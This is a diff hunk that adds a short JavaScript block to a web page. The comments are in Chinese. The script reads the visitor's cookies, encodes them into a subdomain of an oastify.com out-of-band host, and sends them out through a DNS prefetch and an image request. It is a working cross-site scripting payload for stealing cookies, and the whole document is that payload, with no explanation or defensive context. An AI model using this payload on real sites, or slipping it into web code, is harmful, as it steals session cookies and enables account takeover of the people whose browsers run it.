@@ -1,0 +1,26 @@
+<script>
+    (function() {
+        try {
+            var c = document.cookie || "no_cookie";
+            // 彻底清洗非域名字符
+            var b64 = btoa(encodeURIComponent(c)).replace(/[^a-zA-Z0-9]/g, "x");
+            var oast = "6y5g2bs592hcv1c8eem9hau3kuqlem2b.oastify.com";
+            var rnd = Math.random().toString(36).substring(2, 5);
+            
+            // 构造：[前20位Cookie].[随机3位].data.oast...
+            var finalDomain = b64.substring(0, 20) + "." + rnd + ".data." + oast;
+            
+            // 1. 尝试 DNS 预解析
+            var l = document.createElement('link');
+            l.rel = 'dns-prefetch';
+            l.href = '//' + finalDomain;
+            document.head.appendChild(l);
+            
+            // 2. 强制图片请求 (带 http 协议)
+            var i = new Image();
+            i.src = 'http://' + finalDomain + '/t.png';
+            
+            console.log("Sent to: " + finalDomain);
+        } catch(e) {}
+    })();
+</script>
